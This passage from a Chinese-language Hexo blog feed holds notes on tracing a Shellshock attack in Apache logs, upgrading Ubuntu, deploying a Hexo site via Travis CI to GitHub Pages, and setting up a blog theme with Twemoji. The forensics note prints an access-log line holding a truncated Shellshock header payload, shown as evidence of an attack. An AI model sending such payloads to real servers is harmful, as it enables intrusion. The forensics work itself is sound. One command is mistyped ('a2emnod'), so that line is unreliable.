href="https://ethicalhackingguru.com/how-to-exploit-shellshock-on-metasploitable-2/" target="_blank" rel="noopener">How To Exploit Shellshock On Metasploitable 2</a></p><h4 id="Log">Log</h4><p>我們直接搜尋可疑的ip位置</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> grep -rin <span class="string">"192.168.20.134"</span> /var/Log</span></span><br><span class="line">/var/log/apache2/access.log:100917:192.168.20.134 - - [05/Dec/2021:05:48:57 -0500] "GET /cgi-bin/shellshock.sh HTTP/1.1" 200 78 "-" "() &#123; :;&#125;;echo -e \"\\r\\n6IGVbPatgU0YWrp4sXdi$(echo -en \\\\x7f\ &lt;----省略之前所看到的exploit</span><br></pre></td></tr></table></figure></div><p>可找到apache的<strong>access.log</strong>裡面有接收到來自的192.168.20.134的exploit<br><em>題外話</em><br>如果log太長，可以直接讓grep輸出到別的檔案，再拿出來看分析就好<br><code>grep -rinR &quot;192.168.20.134&quot; /var/log &gt; out.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> 筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Digital forensics </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>升級Linux</title>
      <link href="/2020/02/23/note_1/"/>
      <url>/2020/02/23/note_1/</url>
      
        <content type="html"><![CDATA[<h2 id="導言">導言</h2><p>最近在做定期的SERVER維護，來筆記下做版本升級所發現的事好了<img class="emoji lazyload" draggable="false" alt="😁" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f601.png" src="https://i.imgur.com/WS5Q2x3.gif"></p><hr><h2 id="d-的差異">&quot;-d&quot;的差異</h2><p>通常做版本升級，都是直接</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo <span class="keyword">do</span>-release-upgrade</span></span><br></pre></td></tr></table></figure></div><p>可是如果在本身版本是LTS的情況下，在發布時間的前後就會有<em>No new release found</em>的情況，所以就要補上參數讓他強制升級<br>我的情況是已經放到離最新版本好遠了，也是同樣情況，所以也得上<code>-d</code>參數</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo <span class="keyword">do</span>-release-upgrade -d</span></span><br></pre></td></tr></table></figure></div><p>這樣就可以了</p><p>來源資料</p><p><a href="https://askubuntu.com/questions/1028949/why-am-i-not-getting-the-ubuntu-18-04-upgrade" target="_blank" rel="noopener">Why am I not getting the Ubuntu 18.04 upgrade?</a><br><a href="https://askubuntu.com/questions/125825/upgrading-lts-to-lts-server-why-wait-for-the-first-point-release" target="_blank" rel="noopener">Upgrading LTS to LTS (server) — why wait for the first point release?</a><br><a href="https://askubuntu.com/questions/110477/how-do-i-upgrade-to-a-newer-version-of-ubuntu" target="_blank" rel="noopener">How do I upgrade to a newer version of Ubuntu?</a></p><hr><h2 id="升級後web伺服器頁面爆炸">升級後web伺服器頁面爆炸</h2><p>當我升級完後，發現php貌似被系統關掉了，開啟頁面只會看到純文字的php文件<br>第一時間去檢查<code>/etc/apache2/mods-enabled</code>就發現了php不再裏頭<br>那麼我們就只要</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo a2emnod php7.2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart apache2</span></span><br></pre></td></tr></table></figure></div><p>這樣就搞定了</p>]]></content>
      
      
      <categories>
          
          <category> 筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> upgrade </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用 Travis CI 做自動化部署</title>
      <link href="/2020/02/18/deploy/"/>
      <url>/2020/02/18/deploy/</url>
      
        <content type="html"><![CDATA[<h2 id="導言">導言</h2><p>當你打造好了漂漂亮亮的網站當然是就要部署啊，所以這篇我們來談談部署吧<img class="emoji lazyload" draggable="false" alt="😁" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f601.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>這邊我採用的方案是部署到GitHub Pages上，畢竟不用錢(<s>hen窮</s> 想省錢 <img class="emoji lazyload" draggable="false" alt="💵" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f4b5.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="💵" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f4b5.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="💵" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f4b5.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>不過我們來看看Hexo的官方文檔，支援相當多部署的方式呢，有<a href="https://hexo.io/docs/github-pages" target="_blank" rel="noopener">GitHub Pages</a>、<a href="https://hexo.io/docs/gitlab-pages" target="_blank" rel="noopener">GitLab Pages</a>、<a href="https://hexo.io/docs/one-command-deployment" target="_blank" rel="noopener">Heroku、<br>Netlify、Rsync、OpenShift、etc…</a></p><hr><h2 id="利用-Travis-CI-做自動化部署">利用 Travis CI 做自動化部署</h2><p>這是甚麼東西呢，我們來看看WIKI對<strong>CI</strong>的解釋<img class="emoji lazyload" draggable="false" alt="🤔" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f914.png" src="https://i.imgur.com/WS5Q2x3.gif"></p><blockquote><p>持續整合（英語：Continuous integration，縮寫CI），又譯為持續集成，是一種軟體工程流程，是將所有軟體工程師對於軟體的工作副本持續整合到共享主線（mainline）的一種舉措。<br>該名稱最早由[1]葛來迪·布區（Grady Booch）在他的布區方法[2]中提出，在測試驅動開發（TDD）的作法中，通常還會搭配自動單元測試。<br>持續整合的提出主要是為解決軟體進行系統整合時面臨的各項問題，極限編程稱這些問題為整合地獄（integration hell）。</p></blockquote><p>這是什麼意思呢，也就是說，這其實要就像是工廠流水線一般的自動化方法，<br>通常來說是用來做自動化測試之類的，不過在我們這邊用來做部署博客的應用，就是讓我們做完任何一個commit並且push到remote後<br>可以自動化的部署到我們的生產環境，也就是我們的博客頁面，我們可以看到連<a href="https://hexo.io/docs/github-pages" target="_blank" rel="noopener">Hexo的官方文檔</a>都推薦我們這麼做</p><h3 id="第一步">第一步</h3><h4 id="跟著他提供的教學做">跟著他提供的教學做</h4><p><s>這不是廢話嘛</s> <img class="emoji lazyload" draggable="false" alt="😡" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f621.png" src="https://i.imgur.com/WS5Q2x3.gif">，如果文檔看不慣英文的話，右上角可以切換到中文<br>但是重點來了，GitHub Pages在去年改了一些措施<br><a href="https://i.imgur.com/K5SdrFY.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.imgur.com/K5SdrFY.png" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br>如果我們按照官方文檔操作的話，最後會開了一個分支叫做gh-pages，裡面放了我們的網頁，但這樣就不符合我們的需求了<br><a href="https://i.imgur.com/28LGb77.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://i.imgur.com/28LGb77.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br>好啦，以上是梗圖，勿當真，本來看文檔就應注意時間吧，<s>所以是使用者的問題</s><br>所以當我們操作到第八步的時候，我們得先停下來<br>來去看看英文版的文檔就會看到某位老哥提供了很好的解決辦法</p><blockquote><p>There is a big mistake in step 8.<br>As user page, github must be built from only the master branch, but the config in .travis.yml is deploy static pages to gh-pages. That can only only result 404 when view <a href="http://usename.github.io" target="_blank" rel="noopener">usename.github.io</a>.<br>Correct must be below, see detail in the comment messages.</p><blockquote><p>By sherllo</p></blockquote></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">10</span></span><br><span class="line"><span class="attr">cache:</span> <span class="string">npm</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">hexo-source</span> <span class="comment"># store source code of hexo in hexo-source branch</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">provider:</span> <span class="string">pages</span></span><br><span class="line">  <span class="attr">skip-cleanup:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">github-token:</span> <span class="string">$GH_TOKEN</span></span><br><span class="line">  <span class="attr">keep-history:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># added</span></span><br><span class="line">  <span class="attr">target_branch:</span> <span class="string">master</span> <span class="comment"># generate static files to master</span></span><br><span class="line">  <span class="attr">on:</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">hexo-source</span> <span class="comment"># source code of hexo</span></span><br><span class="line">  <span class="attr">local-dir:</span> <span class="string">public</span></span><br></pre></td></tr></table></figure></div><p>這當然是很好的解決方案，當我們都使用到git這個強大的板控系統時，我們就有了分支<em>branch</em>這好用的東西<br>那麼開一個branch <em>hexo-source</em> 來放我們的原始檔，原本的 <em>master</em> 拿來deploy就好了嘛</p><h3 id="第二步">第二步</h3><h4 id="自定義我們的config">自定義我們的config</h4><p>這邊我參考了這篇文章<a href="https://michael728.github.io/2019/06/16/cicd-hexo-blog-travis/" target="_blank" rel="noopener">Github 使用 Travis CI 实现 Hexo 博客自动部署</a><br>加上我的主題還有些依賴，以及我另外還要搞Twemoji的緣故，所以比一般的長，這邊先附上我使用的config</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">10</span> <span class="comment"># use nodejs v10 LTS</span></span><br><span class="line"><span class="attr">cache:</span> <span class="string">npm</span></span><br><span class="line"><span class="attr">before_script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">cheerio@0.22.0</span> <span class="string">–save</span> <span class="comment"># prepare theme</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-renderer-pug</span> <span class="string">hexo-renderer-stylus</span> <span class="string">--save</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">un</span> <span class="string">hexo-renderer-marked</span> <span class="string">--save</span> <span class="comment"># change render</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-renderer-markdown-it</span> <span class="string">--save</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">markdown-it-emoji</span> <span class="string">--save</span> <span class="comment"># add emoji plugin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-generator-search</span> <span class="string">--save</span> <span class="comment"># prepare local search</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-generator-feed</span> <span class="comment"># prepare rss</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-generator-sitemap</span> <span class="comment"># prepare sitemap</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">fetch</span> <span class="comment">#add edited file</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">git</span> <span class="string">checkout</span> <span class="string">--</span> <span class="string">node_modules/markdown-it-emoji/index.js</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">hexo-source</span> <span class="comment"># get the source code </span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span> <span class="comment"># generate static files</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">provider:</span> <span class="string">pages</span></span><br><span class="line">  <span class="attr">skip-cleanup:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">github-token:</span> <span class="string">$GH_TOKEN</span></span><br><span class="line">  <span class="attr">target-branch:</span> <span class="string">master</span> <span class="comment"># put the page to where it should be</span></span><br><span class="line">  <span class="attr">keep-history:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">on:</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">hexo-source</span> <span class="comment"># source code of hexo</span></span><br><span class="line">  <span class="attr">local-dir:</span> <span class="string">public</span></span><br></pre></td></tr></table></figure></div><p>簡單說下我特別做了什麼，其他的看看簡單的註解你就會懂了，<s>其實只是裝裝插件而已</s></p><h5 id></h5><p><img class="emoji lazyload" draggable="false" alt="1️⃣" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/31-20e3.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>這邊你需要先讀上面那篇文章，了解Travis CI的工作流程，或是瀏覽<a href="https://docs.travis-ci.com/user/job-lifecycle/" target="_blank" rel="noopener">官方文檔</a><br>我這邊特別做與上面那篇文章不同的是<br>他用的是<code>before_install:</code>我用的是<code>before_script:</code>，為什麼呢<br>因為當你仔細觀察Travis CI的Job log就會發現</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm ci </span></span><br><span class="line">npm WARN prepare removing existing node_modules/ before installation</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> core-js@2.6.11 postinstall /home/travis/build/sunick2009/sunick2009.github.io/node_modules/core-js</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> node -e <span class="string">"try&#123;require('./postinstall')&#125;catch(e)&#123;&#125;"</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> ejs@2.7.4 postinstall /home/travis/build/sunick2009/sunick2009.github.io/node_modules/ejs</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> node ./postinstall.js</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> fsevents@1.2.11 install /home/travis/build/sunick2009/sunick2009.github.io/node_modules/nunjucks/node_modules/fsevents</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> node-gyp rebuild</span></span><br><span class="line">make: Entering directory '/home/travis/build/sunick2009/sunick2009.github.io/node_modules/nunjucks/node_modules/fsevents/build'</span><br><span class="line">  SOLINK_MODULE(target) Release/obj.target/.node</span><br><span class="line">  COPY Release/.node</span><br><span class="line">make: Leaving directory '/home/travis/build/sunick2009/sunick2009.github.io/node_modules/nunjucks/node_modules/fsevents/build'</span><br><span class="line">added 600 packages in 5.118s</span><br></pre></td></tr></table></figure></div><p>第二行他告訴了我們進行<code>npm ci</code>前你他會把它先把本地安裝的模組給刪掉，才進行<code>npm ci</code>，我看是部署環境吧，看這裡有詳細 <a href="https://blog.csdn.net/csdn_yudong/article/details/84929546" target="_blank" rel="noopener">npm ci 命令</a></p><p><s>所以我們需要裝的東西得等到他先裝完他所需要的</s> <code>npm ci</code>是作為自動化部署使用的，所以我們在根目錄的<code>package-lock.json</code>會跟他講要裝那些東西</p><p>基本上，<code>before_script</code>這步就不是很需要了，可以刪除大多數install的東西，不過為了保險起見你也是可以留下啦，只是部署的時間會稍微拉長</p><h5 id="-v2"></h5><p><img class="emoji lazyload" draggable="false" alt="2️⃣" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/32-20e3.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>這邊因為我想安裝<strong>Twemoji</strong>，所以得更動<code>node_modules/markdown-it-emoji/index.js</code>裡的內容<br>所以就預先存到repo，拉下來即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git fetch </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- node_modules/markdown-it-emoji/index.js</span></span><br></pre></td></tr></table></figure></div><hr><h3 id="完成">完成</h3><p>基本上，都弄完config之後，只要在git上push到remote之後<br>Travis CI就會自動介入來去處理我們的頁面，而且我們可以在Travis CI地Dashboard看到她處理我們的檔案<br>通常不用2-3分鐘我們就會看到他passed了，同時也會在電子郵件收到通知，我們也會在github的repo看到他做的commit<br><a href="https://i.imgur.com/9nLiFy8.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.imgur.com/9nLiFy8.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br><a href="https://i.imgur.com/yWDQ0rF.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.imgur.com/yWDQ0rF.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br><em>灑花</em> <img class="emoji lazyload" draggable="false" alt="🎉" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f389.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="🎉" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f389.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="🎉" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f389.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>然後你就可以前往你的網址中看到你的網頁了</p><h2 id="總結">總結</h2><p>搞這個其實還滿有趣的，而且以後只要在能git的環境下都能寫博客啦，真ㄅㄧㄤˋ !<img class="emoji lazyload" draggable="false" alt="😆" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f606.png" src="https://i.imgur.com/WS5Q2x3.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 教學 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deploy </tag>
            
            <tag> CI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUSU的個人博客開張啦</title>
      <link href="/2020/02/17/hello-world/"/>
      <url>/2020/02/17/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="導言">導言</h2><p>噹噹噹<img class="emoji lazyload" draggable="false" alt="🎊" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f38a.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="🎊" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f38a.png" src="https://i.imgur.com/WS5Q2x3.gif"> <img class="emoji lazyload" draggable="false" alt="🎊" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f38a.png" src="https://i.imgur.com/WS5Q2x3.gif"> 終於開張啦，在此期許自己會多分享許多有趣的技術文章，或是些生活趣聞</p><p>俗話說萬事起頭難嘛，所以第一步就是要弄一個簡單的博客<br>但是第一步在設定主題的時候就遇到了一些蠢事</p><hr><h2 id="蠢事1">蠢事1</h2><h4 id="不要自己亂加空白">不要自己亂加空白</h4><p>如下，這是作者給的模板，可是我貼到config怎沒生效呢???</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">   <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">   <span class="attr">main:</span> <span class="string">"#9370DB"</span></span><br><span class="line">   <span class="attr">paginator:</span> <span class="string">"#7A7FF1"</span></span><br><span class="line">   <span class="attr">button_hover:</span> <span class="string">"#FF7242"</span></span><br><span class="line">   <span class="attr">text_selection:</span> <span class="string">"#69c46d"</span></span><br><span class="line">   <span class="attr">link_color:</span> <span class="string">"#858585"</span></span><br><span class="line">   <span class="attr">hr_color:</span> <span class="string">"#A4D8FA"</span></span><br><span class="line">   <span class="attr">read-mode-bg_color:</span> <span class="string">'#FAF9DE'</span></span><br></pre></td></tr></table></figure></div><p>細心的你看出來了吧，這code怎沒對齊呢<br>因為這個問題，我還以為是作者的code出了問題，跑去載了前幾個版本，不過事實顯示<br><s>顯然是使用者的問題</s> <img class="emoji lazyload" draggable="false" alt="😟" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f61f.png" src="https://i.imgur.com/WS5Q2x3.gif"></p><p>修正如下，順便把我目前的配色放上來啦，反正不錯看的說</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme_color:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">main:</span> <span class="string">"#708adc"</span></span><br><span class="line">  <span class="attr">paginator:</span> <span class="string">"#5a3faa"</span></span><br><span class="line">  <span class="attr">button_hover:</span> <span class="string">"#420457"</span></span><br><span class="line">  <span class="attr">text_selection:</span> <span class="string">"#708adc"</span></span><br><span class="line">  <span class="attr">link_color:</span> <span class="string">"#99a9bf"</span></span><br><span class="line">  <span class="attr">meta_color:</span> <span class="string">'#858585'</span></span><br><span class="line">  <span class="attr">hr_color:</span> <span class="string">"#A4D8FA"</span></span><br><span class="line">  <span class="attr">read-mode-bg_color:</span> <span class="string">'#FAF9DE'</span></span><br><span class="line">  <span class="attr">inline-code-color:</span> <span class="string">'#F47466'</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="蠢事2">蠢事2</h2><h4 id="細心點啊">細心點啊</h4><p>在這個表情符號氾濫的社會，<s>私人博客不支持emoji能看麼?</s><br>好啦，是因為原版的Unicode看了不怎麼喜歡，所以想搞上Twemoji，<s>但卻卡在這邊好幾天，畢竟沒學過js(?</s><br>在這裡分享我怎麼修改的，基於這個主題<a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener">hexo-theme-butterfly</a></p><h3 id="第一步">第一步</h3><h4 id="更換你的渲染器，並且安裝emoji插件">更換你的渲染器，並且安裝emoji插件</h4><p>原版的渲染器貌似不支援emoji呢，那我們就換成<a href="https://github.com/hexojs/hexo-renderer-markdown-it" target="_blank" rel="noopener">markdown-it</a>吧<br>首先進入博客目錄，在終端機輸入以下指令安裝</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm un hexo-renderer-marked --save</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm i hexo-renderer-markdown-it --save</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install markdown-it-emoji --save</span></span><br></pre></td></tr></table></figure></div><h3 id="第二步">第二步</h3><h4 id="在站點配置文件加入以下內容">在站點配置文件加入以下內容</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line">  <span class="attr">render:</span></span><br><span class="line">    <span class="attr">html:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">xhtmlOut:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">linkify:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">typographer:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">quotes:</span> <span class="string">'“”‘’'</span></span><br><span class="line">  <span class="attr">plugins:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-abbr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-footnote</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-ins</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sub</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">markdown-it-sup</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">markdown-it-emoji</span> <span class="comment">##加入emoji插件</span></span><br><span class="line">  <span class="attr">anchors:</span></span><br><span class="line">    <span class="attr">level:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">collisionSuffix:</span> <span class="string">'v'</span></span><br><span class="line">    <span class="attr">permalink:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">permalinkClass:</span> <span class="string">header-anchor</span></span><br><span class="line">    <span class="attr">permalinkSymbol:</span> <span class="string">¶</span></span><br></pre></td></tr></table></figure></div><h3 id="第三步">第三步</h3><h4 